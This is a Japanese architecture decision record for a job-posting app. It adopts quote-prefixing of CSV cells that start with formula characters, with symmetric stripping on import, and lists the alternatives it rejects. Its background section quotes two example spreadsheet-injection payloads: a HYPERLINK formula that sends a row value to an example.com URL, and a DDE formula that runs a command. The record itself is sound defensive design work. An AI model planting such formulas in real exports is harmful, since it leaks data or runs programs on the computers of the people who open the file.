# ADR 0061: 書き出す CSV の値へ文字列の印を付け、取り込みで対称に取り除く

- 状態: 採用
- 決定日: 2026-08-02

この文書は日本語版を正本とする。

## 背景

ADR 0058 は求人の CSV 入出力を決めた。
`JobPostingCsv#export` は、求人の値をそのまま列へ書く。

Excel、LibreOffice Calc、Numbers は、`=`、`+`、`-`、`@`、
タブ（0x09）、復帰（0x0d）で始まるセルを**数式として解釈する**。

- `=HYPERLINK("https://example.com/?"&A1,"開く")` は、
  開いた人が押した時点で、同じ行の値を外部へ送る
- `=cmd|' /c calc'!A1`（DDE）は、環境によっては外部のプログラムを起動する

求人は組織の**所属者であれば誰でも作れる**。管理者である必要はない。
一方、CSV を書き出すのは**管理者**である。
つまり、一般の所属者が仕込み、管理者の端末で動くという順序が成り立つ。

取り込みも同じ値を受け入れるため、取り込み → 書き出しの往復で残る。

**CSV そのものは壊れていない。**引用符の規則は正しく守られている。
壊れるのは開く側であり、CSV の書式の正しさでは防げない。

## 決定

- 書き出す値が数式の文字で始まる場合、先頭へ `'`（文字列の印）を付ける
- 対象は `=`、`+`、`-`、`@`、タブ、復帰とする。値を 1 か所へ置く
  （`JobPostingCsv::FORMULA_TRIGGERS`）
- **文字列だけを対象にする。**数値の列は数式になりえない
- 取り込みで**対称に取り除く**。印の後ろが数式の文字である場合だけ取り除く
- 判定と復元は `JobPostingCsv` の中へ置く。呼び出し側では扱わない
- 入力の側では拒否しない

## 理由

印を付けるのは、表計算ソフトが「これは文字列である」と読む唯一の共通の合図が
これだからである。値そのものは変わらず、開いたときの表示も変わらない。

**文字列だけを対象にする**のは、数値の列へ印を付けると、
金額の列が文字列として読まれるためである。
`annual_salary_min` は整数の列であり、数式が入ることはない。

取り込みで**対称に取り除く**のは、往復のたびに印が増えるのを避けるためである。
ADR 0058 は「同じ入力を再実行しても二重処理されない」ことを条件にした。
値が往復で変わるなら、再実行してよいとは言えない。

**印の後ろが数式の文字である場合だけ**取り除くのは、
`'` から始まる正当な値（引用の記号など）を壊さないためである。

**入力の側で拒否しない**のは、`-3 年以上` のような正当な入力を拒むためである。
危険なのは値ではなく、値の**開かれ方**である。
拒否の場所を入力へ置くと、正当な求人が書けなくなる。

## 採用しない代替案

| 代替案 | 採用しない理由 |
| --- | --- |
| 何もしない（CSV の書式は正しい） | 壊れるのは開く側である。書式の正しさでは防げない |
| 入力の時点で数式の文字を拒否する | `-3 年以上` のような正当な入力を拒む |
| 危険な文字を取り除く | 値が黙って変わる。求人の内容が書いたものと違う |
| 印を付けたまま取り込む | 往復のたびに印が増える。再実行してよいと言えなくなる |
| 印を無条件に取り除く | `'` から始まる正当な値が壊れる |
| 数値にも印を付ける | 金額の列が文字列として読まれる |
| CSV をやめて別の形式にする | ADR 0058 の判断を覆す。受け渡しの相手が読めなくなる |

## 影響

- 書き出した CSV を機械で読む側は、`'` が付いた値を受け取ることがある。
  こちらの取り込みは対称に扱うが、**別の仕組みへ渡す場合は相手の扱いによる**
- 対象の文字を増やすときは `FORMULA_TRIGGERS` だけを変える。
  書き出しと取り込みの両方に効く
- 応募者・候補者の CSV は作らない（ADR 0058 の非目標）。
  この判断はその範囲を広げない
